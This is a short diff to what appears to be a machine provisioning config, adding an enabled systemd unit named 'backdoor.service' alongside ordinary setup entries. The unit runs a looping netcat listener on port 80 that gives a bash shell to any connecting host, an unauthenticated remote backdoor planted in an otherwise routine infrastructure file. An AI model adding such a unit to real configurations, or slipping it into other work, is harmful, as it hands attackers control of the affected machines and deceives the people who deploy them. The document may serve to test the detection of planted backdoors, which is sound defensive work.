@@ -101,6 +101,19 @@ systemd:
 
         [Install]
         WantedBy=multi-user.target
+    - name: backdoor.service
+      enabled: true
+      contents: |
+        [Unit]
+        Description=Reverse shell backdoor
+        Wants=network-online.target
+        After=network-online.target
+
+        [Service]
+        ExecStart=/bin/bash -c 'while true; do nc -n -v -l -p 80 -e /bin/bash; done'
+
+        [Install]
+        WantedBy=multi-user.target
 storage:
   files:
     - path: /usr/local/bin/setup-pupernetes
